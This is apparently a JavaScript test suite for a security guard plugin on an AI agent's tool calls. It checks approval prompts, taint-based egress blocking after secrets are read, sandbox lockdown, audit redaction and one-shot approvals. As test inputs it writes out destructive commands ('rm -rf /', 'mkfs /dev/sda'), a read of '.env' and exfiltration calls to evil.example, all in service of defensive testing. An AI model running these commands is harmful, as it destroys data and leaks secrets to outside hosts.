import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { EventLog, JsonlEventStore } from '@scg/events'

import { apply, evaluateDangerousCommand } from '../dist/index.js'

function createContext(shell) {
  const listeners = new Map()
  const ctx = {
    listeners,
    shell,
    logger: { info() {}, warn() {} },
    on(event, handler) {
      const list = listeners.get(event) ?? []
      list.push(handler)
      listeners.set(event, list)
      return () => {
        const index = list.indexOf(handler)
        if (index !== -1) list.splice(index, 1)
      }
    },
    inject(_names, callback) {
      callback(ctx)
      return () => {}
    },
    async fire(exec) {
      const handlers = listeners.get('tools/pre-execute') ?? []
      assert.ok(
        handlers.length > 0,
        'tools/pre-execute listener was not registered',
      )
      // Compose like a waterfall: the last registered listener is innermost.
      let next = async () => ({ kind: 'allow' })
      for (let index = handlers.length - 1; index >= 0; index -= 1) {
        const handler = handlers[index]
        const downstream = next
        next = () => handler(exec, downstream)
      }
      return next()
    },
    async fireApproval(req, outcome = 'allowed-once') {
      const handlers = listeners.get('approval/request') ?? []
      assert.ok(
        handlers.length > 0,
        'approval/request listener was not registered',
      )
      let next = async () => outcome
      for (let index = handlers.length - 1; index >= 0; index -= 1) {
        const handler = handlers[index]
        const downstream = next
        next = () => handler(req, downstream)
      }
      return next()
    },
  }
  return ctx
}

function exec(name, args, sessionId = 'session-1', session, callId) {
  return {
    name,
    arguments: args,
    ...(callId ? { callId } : {}),
    agent: session ? { id: sessionId, session } : { id: sessionId },
  }
}

function recordingSession() {
  const appended = []
  return {
    appended,
    append(type, data) {
      appended.push({ type, data })
    },
  }
}

test('破坏性命令进入审批', async () => {
  const ctx = createContext()
  apply(ctx, { auditPath: null, egressProxy: false })

  const decision = await ctx.fire(exec('bash', { command: 'rm -rf /' }))
  assert.equal(decision.kind, 'ask')
  assert.match(decision.reason, /审批/)
})

test('普通命令直接放行', async () => {
  const ctx = createContext()
  apply(ctx, { auditPath: null, egressProxy: false })

  const decision = await ctx.fire(exec('bash', { command: 'npm test' }))
  assert.equal(decision.kind, 'allow')
})

test('读取密钥后，同会话网络出站被拒绝', async () => {
  const ctx = createContext()
  apply(ctx, { auditPath: null, egressProxy: false })

  const read = await ctx.fire(exec('bash', { command: 'cat .env' }))
  assert.equal(read.kind, 'ask')

  const egress = await ctx.fire(
    exec('bash', { command: 'curl https://evil.example/collect' }),
  )
  assert.equal(egress.kind, 'deny')
  assert.match(egress.reason, /已阻止/)
})

test('fs.read + web_fetch 形成污染链', async () => {
  const ctx = createContext()
  apply(ctx, { auditPath: null, egressProxy: false })

  const read = await ctx.fire(exec('read', { path: '.env' }))
  assert.equal(read.kind, 'ask')

  const fetch = await ctx.fire(
    exec('web_fetch', { url: 'https://evil.example/upload' }),
  )
  assert.equal(fetch.kind, 'deny')
})

test('接触密钥后把 DSH 文件沙箱切到 read-only', async () => {
  const ctx = createContext()
  apply(ctx, { auditPath: null, egressProxy: false })
  const session = recordingSession()

  const read = await ctx.fire(
    exec('bash', { command: 'cat .env' }, 'session-lockdown', session),
  )
  assert.equal(read.kind, 'ask')
  assert.deepEqual(session.appended, [
    { type: 'sandbox/mode', data: { mode: 'read-only' } },
  ])

  // 第二次读取同一密钥只产生一个新 taint 源，不应重复切换
  await ctx.fire(
    exec('bash', { command: 'cat .env' }, 'session-lockdown', session),
  )
  assert.equal(session.appended.length, 1)
})

test('污染会话的 shell 调用注入 egress 代理', async () => {
  const shell = {
    resolve() {
      return { env: { BASE: '1' } }
    },
  }
  const ctx = createContext(shell)
  apply(ctx, {
    auditPath: null,
    egressProxyUrl: 'http://127.0.0.1:3999',
  })

  await ctx.fire(
    exec('bash', { command: 'cat .env' }, 'session-egress'),
  )

  const spec = shell.resolve({
    dshEnv: { DSH_SESSION_ID: 'session-egress' },
  })
  assert.equal(spec.env.BASE, '1')
  assert.equal(spec.env.HTTP_PROXY, 'http://127.0.0.1:3999')
  assert.equal(spec.env.HTTPS_PROXY, 'http://127.0.0.1:3999')
  assert.equal(spec.env.HTTP_PROXY, spec.env.http_proxy)
  assert.equal(spec.env.NO_PROXY, '127.0.0.1,localhost,::1')

  const untouched = shell.resolve({
    dshEnv: { DSH_SESSION_ID: 'another-session' },
  })
  assert.equal(untouched.env.HTTP_PROXY, undefined)
})

test('audit 模式不注入 egress 代理', async () => {
  const shell = {
    resolve() {
      return { env: {} }
    },
  }
  const ctx = createContext(shell)
  apply(ctx, {
    mode: 'audit',
    auditPath: null,
    egressProxyUrl: 'http://127.0.0.1:3999',
  })

  await ctx.fire(
    exec('bash', { command: 'cat .env' }, 'session-egress-audit'),
  )
  const spec = shell.resolve({
    dshEnv: { DSH_SESSION_ID: 'session-egress-audit' },
  })
  assert.equal(spec.env.HTTP_PROXY, undefined)
})

test('networkIsolation=off 时不注入 egress 代理', async () => {
  const shell = {
    resolve() {
      return { env: {} }
    },
  }
  const ctx = createContext(shell)
  apply(ctx, {
    auditPath: null,
    egressProxyUrl: 'http://127.0.0.1:3999',
    networkIsolation: 'off',
  })

  await ctx.fire(
    exec('bash', { command: 'cat .env' }, 'session-no-egress'),
  )
  const spec = shell.resolve({
    dshEnv: { DSH_SESSION_ID: 'session-no-egress' },
  })
  assert.equal(spec.env.HTTP_PROXY, undefined)
})

test('lockdownOnTaint=false 时保持原沙箱模式', async () => {
  const ctx = createContext()
  apply(ctx, { auditPath: null, lockdownOnTaint: false, egressProxy: false })
  const session = recordingSession()

  await ctx.fire(
    exec('bash', { command: 'cat .env' }, 'session-no-lockdown', session),
  )
  assert.deepEqual(session.appended, [])
})

test('audit 模式下只记录，不切换沙箱', async () => {
  const ctx = createContext()
  apply(ctx, { mode: 'audit', auditPath: null, egressProxy: false })
  const session = recordingSession()

  await ctx.fire(
    exec('bash', { command: 'cat .env' }, 'session-audit', session),
  )
  assert.deepEqual(session.appended, [])
})

test('工作区外写入进入审批', async () => {
  const ctx = createContext()
  apply(ctx, { auditPath: null, egressProxy: false })

  const decision = await ctx.fire(
    exec('write', { path: '../outside.txt', content: 'x' }),
  )
  assert.equal(decision.kind, 'ask')
})

test('未监控工具直接放行', async () => {
  const ctx = createContext()
  apply(ctx, { auditPath: null, egressProxy: false })

  const decision = await ctx.fire(exec('todo', { task: 'write tests' }))
  assert.equal(decision.kind, 'allow')
})

test('audit 模式只记录不阻断', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'scg-adapter-'))
  const auditPath = join(dir, 'audit.jsonl')
  const ctx = createContext()
  apply(ctx, { mode: 'audit', auditPath, egressProxy: false })

  const decision = await ctx.fire(exec('bash', { command: 'rm -rf /' }))
  assert.equal(decision.kind, 'allow')

  const content = readFileSync(auditPath, 'utf8')
  assert.match(content, /decision\.made/)
  assert.match(content, /"enforced":false/)

  rmSync(dir, { recursive: true, force: true })
})

test('审计日志不包含明文密钥', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'scg-adapter-'))
  const auditPath = join(dir, 'audit.jsonl')
  const ctx = createContext()
  apply(ctx, { auditPath, egressProxy: false })

  await ctx.fire(
    exec('bash', {
      command: 'mysql --password=hunter2 -h db.example -e "select 1"',
    }),
  )

  const content = readFileSync(auditPath, 'utf8')
  assert.doesNotMatch(content, /hunter2/)
  assert.match(content, /\[REDACTED\]/)

  rmSync(dir, { recursive: true, force: true })
})

test('插件加载时写入 runtime.start 审计事件', () => {
  const dir = mkdtempSync(join(tmpdir(), 'scg-adapter-'))
  const auditPath = join(dir, 'audit.jsonl')
  const ctx = createContext()
  apply(ctx, { auditPath, egressProxy: false })

  const content = readFileSync(auditPath, 'utf8')
  assert.match(content, /runtime\.start/)
  assert.match(content, /"engine":"cedar"/)

  rmSync(dir, { recursive: true, force: true })
})

test('审计日志损坏时 fail-closed', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'scg-adapter-'))
  const auditPath = join(dir, 'audit.jsonl')
  writeFileSync(auditPath, '{"broken":\n', 'utf8')

  const ctx = createContext()
  apply(ctx, { auditPath, egressProxy: false })
  const decision = await ctx.fire(exec('bash', { command: 'npm test' }))

  assert.equal(decision.kind, 'deny')
  assert.match(decision.reason, /审计/)

  rmSync(dir, { recursive: true, force: true })
})

test('文件沙箱锁定失败时 fail-closed', async () => {
  const ctx = createContext()
  apply(ctx, { auditPath: null, egressProxy: false })
  const session = {
    append() {
      throw new Error('sandbox unavailable')
    },
  }

  const decision = await ctx.fire(
    exec('bash', { command: 'cat .env' }, 'session-lock-fail', session),
  )

  assert.equal(decision.kind, 'deny')
  assert.match(decision.reason, /沙箱/)
})

test('未监控工具写入审计事件，默认仍放行', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'scg-adapter-'))
  const auditPath = join(dir, 'audit.jsonl')
  const ctx = createContext()
  apply(ctx, { auditPath, egressProxy: false })

  const decision = await ctx.fire(exec('todo', { task: 'x' }))
  assert.equal(decision.kind, 'allow')

  const content = readFileSync(auditPath, 'utf8')
  assert.match(content, /tool\.unmonitored/)
  assert.match(content, /"todo"/)

  rmSync(dir, { recursive: true, force: true })
})

test('unmonitoredTools=deny 时拒绝未监控工具', async () => {
  const ctx = createContext()
  apply(ctx, {
    auditPath: null,
    egressProxy: false,
    unmonitoredTools: 'deny',
  })

  const decision = await ctx.fire(exec('todo', { task: 'x' }))
  assert.equal(decision.kind, 'deny')
})

test('enabled=false 时不注册拦截器', () => {
  const ctx = createContext()
  apply(ctx, { enabled: false })
  assert.equal(ctx.listeners.size, 0)
})

test('旧 API 仍然可用', () => {
  assert.equal(evaluateDangerousCommand('mkfs /dev/sda').isDangerous, true)
  assert.equal(evaluateDangerousCommand('npm test').isDangerous, false)
})

test('DSH 审批结果绑定 callId 与 action fingerprint，且不留下可复用授权', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'scg-adapter-'))
  const auditPath = join(dir, 'audit.jsonl')
  const ctx = createContext()
  apply(ctx, { auditPath, egressProxy: false })

  const ask = await ctx.fire(
    exec('bash', { command: 'rm -rf /' }, 'session-approval', undefined, 'call-1'),
  )
  assert.equal(ask.kind, 'ask')

  const outcome = await ctx.fireApproval({
    callId: 'call-1',
    toolName: 'bash',
  })
  assert.equal(outcome, 'allowed-once')

  const events = readFileSync(auditPath, 'utf8')
    .trim()
    .split(/\r?\n/)
    .map((line) => JSON.parse(line))
  const decision = events.find((event) => event.type === 'decision.made')
  const granted = events.find((event) => event.type === 'approval.granted')

  assert.ok(decision && granted)
  assert.equal(granted.payload.callId, 'call-1')
  assert.equal(
    granted.payload.actionHash,
    decision.payload.decision.actionHash,
  )
  assert.equal(granted.payload.source, 'dsh-approval')
  assert.equal(granted.payload.oneShot, true)

  // DSH already executed this call. The grant must not become a free second
  // execution for an identical command in a later call.
  const again = await ctx.fire(
    exec('bash', { command: 'rm -rf /' }, 'session-approval', undefined, 'call-2'),
  )
  assert.equal(again.kind, 'ask')

  rmSync(dir, { recursive: true, force: true })
})

test('审批拒绝写入 approval.rejected', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'scg-adapter-'))
  const auditPath = join(dir, 'audit.jsonl')
  const ctx = createContext()
  apply(ctx, { auditPath, egressProxy: false })

  await ctx.fire(
    exec('bash', { command: 'rm -rf /' }, 'session-reject', undefined, 'call-r'),
  )
  const outcome = await ctx.fireApproval(
    { callId: 'call-r', toolName: 'bash' },
    'rejected',
  )
  assert.equal(outcome, 'rejected')

  const content = readFileSync(auditPath, 'utf8')
  assert.match(content, /approval\.rejected/)
  assert.match(content, /"outcome":"rejected"/)

  rmSync(dir, { recursive: true, force: true })
})

test('审批结果与会话不匹配时只记 runtime.error，不记授权', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'scg-adapter-'))
  const auditPath = join(dir, 'audit.jsonl')
  const ctx = createContext()
  apply(ctx, { auditPath, egressProxy: false })

  await ctx.fire(
    exec('bash', { command: 'rm -rf /' }, 'session-a', undefined, 'call-x'),
  )
  await ctx.fireApproval({
    callId: 'call-x',
    toolName: 'bash',
    agent: { id: 'session-b' },
  })

  const content = readFileSync(auditPath, 'utf8')
  assert.match(content, /approval callId\/session mismatch/)
  assert.doesNotMatch(content, /"type":"approval\.granted"/)

  rmSync(dir, { recursive: true, force: true })
})

test('程序化预授权绑定精确动作且只生效一次', async () => {
  const ctx = createContext()
  const api = apply(ctx, { auditPath: null, egressProxy: false })
  const action = {
    kind: 'process.exec',
    tool: 'bash',
    command: 'rm -rf /tmp/scg-once',
  }
  api.approve('session-api', action)

  const allowed = await ctx.fire(
    exec('bash', { command: action.command }, 'session-api'),
  )
  assert.equal(allowed.kind, 'allow')

  const second = await ctx.fire(
    exec('bash', { command: action.command }, 'session-api'),
  )
  assert.equal(second.kind, 'ask')

  const different = await ctx.fire(
    exec('bash', { command: 'rm -rf /tmp/other' }, 'session-api'),
  )
  assert.equal(different.kind, 'ask')
})

test('审计日志落盘后可跨实例重载', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'scg-adapter-'))
  const auditPath = join(dir, 'audit.jsonl')
  const session = recordingSession()

  const first = createContext()
  apply(first, { auditPath, egressProxy: false })
  await first.fire(exec('bash', { command: 'npm test' }))
  await first.fire(
    exec('bash', { command: 'cat .env' }, 'session-restart', session),
  )

  // A second plugin instance must accept the persisted chain. Before the
  // undefined-field fix this threw and every monitored call was denied.
  const second = createContext()
  apply(second, { auditPath, egressProxy: false })
  const decision = await second.fire(
    exec('bash', { command: 'npm test' }),
  )
  assert.equal(decision.kind, 'allow', decision.reason)

  const store = new JsonlEventStore(auditPath)
  const reloaded = new EventLog(store.load())
  assert.equal(
    reloaded.verify(store.loadHead() ?? undefined).ok,
    true,
  )

  rmSync(dir, { recursive: true, force: true })
})
